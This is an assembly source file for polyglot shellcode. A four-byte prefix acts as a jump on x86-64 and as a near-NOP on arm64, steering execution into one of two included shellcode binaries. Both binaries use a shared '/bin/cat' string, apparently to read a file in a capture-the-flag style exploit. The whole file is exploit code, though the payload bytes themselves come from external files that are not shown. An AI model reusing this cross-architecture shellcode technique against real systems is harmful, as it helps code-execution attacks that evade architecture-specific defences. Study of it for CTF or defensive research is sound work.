.intel_syntax noprefix
.global _start
.text

# Polymorphic instruction:
_start:
    # We can assume: The carry is on (on x86_64)
    # x86 -     This is "jc" opcode to the middle of "aarch64" shellcode
    # arm64 -   This is "sub	w18, w27, #0xf9f, lsl #12" (practically NOP, clobbers W18)
    .byte 0x72
    .byte 0x66  # Offset - into middle of aarch64 shellcode
    .byte 0x7e
    .byte 0x51

# aarch64 shellcode
_aarch64:
    .incbin "aarch64.shellcode"

# x86-64 shellcode
_x86_64:
    .incbin "x86-64.shellcode"

# Last 8-bytes (offset 0x110) are the '/bin/cat\0' string - for use of both shellcodes.
# Because the page is mmap-ed we know its values are zero, hence we don't need to
# null-terminate the string ourselves.
bin_cat_string:
    .ascii "/bin/cat"
